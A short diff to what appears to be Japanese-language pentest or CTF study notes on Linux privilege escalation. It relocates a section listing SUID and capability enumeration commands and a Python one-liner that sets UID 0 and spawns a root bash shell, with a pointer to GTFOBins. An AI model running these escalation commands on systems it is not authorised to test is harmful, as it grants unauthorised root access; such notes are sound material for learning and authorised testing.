@@ -527,7 +527,14 @@ run
 ```
 find / -perm -u=s -type f 2>/dev/null
 getcap -r / 2>/dev/null 
+
+ex: これで、python がでてきたら。
+
+python -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+上記でpython 以外が出てきたら、[gtfobins](https://gtfobins.github.io/) から、該当のコマンドを探す。
 ```
+
 
 - ある特定のファイルが定期実行されているか
 
@@ -576,13 +583,7 @@ dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/nul
 
 getcap -r / 2>/dev/null
 
-これで、python がでてきたら。
 
-python -c 'import os; os.setuid(0); os.system("/bin/bash")'
-
-```
-
-上記でpython 以外が出てきたら、[gtfobins](https://gtfobins.github.io/) から、該当のコマンドを探す。
 
 
 ・var/log/syslog 見て、ある特定のファイルが定期実行されているなどの手がかりを見にいく。
